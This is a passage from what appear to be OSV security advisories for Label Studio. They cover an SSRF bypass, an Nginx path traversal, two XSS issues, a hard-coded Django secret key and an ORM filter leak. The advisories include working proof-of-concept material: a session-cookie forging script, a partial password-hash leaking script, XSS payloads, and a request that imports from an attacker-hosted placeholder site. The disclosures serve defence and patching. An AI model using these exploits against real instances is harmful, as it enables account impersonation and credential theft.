BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    